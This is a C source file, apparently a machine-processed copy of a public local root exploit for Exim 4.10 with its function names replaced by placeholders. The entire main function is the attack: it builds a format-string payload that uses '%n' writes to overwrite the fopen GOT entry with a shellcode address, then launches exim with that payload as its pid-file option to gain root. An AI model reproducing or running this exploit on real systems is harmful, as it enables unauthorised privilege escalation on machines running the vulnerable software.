#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int FOPEN_GOT_ADDRESS ; 
 int PADDING ; 
 int FUNC0 (unsigned long) ; 
 int FUNC1 (unsigned long) ; 
 int FUNC2 (unsigned long) ; 
 int FUNC3 (unsigned long) ; 
 int /*<<< orphan*/  SHELLCODE_ADDRESS ; 
 int /*<<< orphan*/  FUNC4 (unsigned char*,char*,char*,char*,char*,unsigned char*,char*,unsigned char*,char*,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,unsigned int*,unsigned int*,unsigned int*,unsigned int*,int) ; 
 int /*<<< orphan*/  FUNC7 (int*,int*,int*) ; 
 unsigned char* path ; 
 int port ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int /*<<< orphan*/  shellcode ; 
 int /*<<< orphan*/  FUNC9 (unsigned char*,char*,int,...) ; 
 int /*<<< orphan*/  FUNC10 (unsigned char*,...) ; 
 int /*<<< orphan*/  FUNC11 (unsigned char*,char*) ; 

int FUNC12(int argc, char **argv)
{
   int bigpops, smallpops, bytes_written, i;
   unsigned char fs[10000], hilf[1000];
   unsigned long a=FOPEN_GOT_ADDRESS,
                 b=FOPEN_GOT_ADDRESS+1,
                 c=FOPEN_GOT_ADDRESS+2,
                 d=FOPEN_GOT_ADDRESS+3; 
   unsigned int p1,p2,p3,p4;

   if(argc!=2)
   {
      FUNC8("local root exploit for exim 4.10 [only works for exim admin users]\n\n");
      FUNC8("./hoagie_exim path_to_exim\n\n");
      FUNC5(1);
   }
   FUNC11(path,argv[1]);        // exploiting an exploit? hehe

   FUNC7(&bigpops,&smallpops,&bytes_written);
   FUNC8("Using %d bigpops and %d smallpops.\n", bigpops,smallpops);
   FUNC8("Written bytes: %d\n",bytes_written);

   FUNC11(fs,"/tmp/%s");
   for(i=0;i<PADDING;i++)
      FUNC10(fs,"Z");

   FUNC9(hilf,"0000%c%c%c%c"
               "0000%c%c%c%c"
               "0000%c%c%c%c"
               "0000%c%c%c%c",
           FUNC0(a),FUNC1(a),FUNC2(a),FUNC3(a),FUNC0(b),FUNC1(b),FUNC2(b),FUNC3(b),
           FUNC0(c),FUNC1(c),FUNC2(c),FUNC3(c),FUNC0(d),FUNC1(d),FUNC2(d),FUNC3(d)); 
   FUNC10(fs,hilf);
   for(i=0;i<bigpops;i++)
      FUNC10(fs,"%+e");
   for(i=0;i<smallpops;i++)
      FUNC10(fs,"%08x"); 

   FUNC6(SHELLCODE_ADDRESS,&p1,&p2,&p3,&p4,bytes_written);

   FUNC9(hilf,"%%.%uu%%n%%.%uu%%n%%.%uu%%n%%.%uu%%n",p1,p2,p3,p4);
   FUNC10(fs,hilf);
  
   // GET ROOT 
   FUNC8("calling exim with fs='%s'\n",fs);
   FUNC9(hilf,"%d",++port);
   FUNC4(path,"exim","-bd","-d","-oX",hilf,"-oP",fs,"-F",shellcode,NULL);

   return 0;
}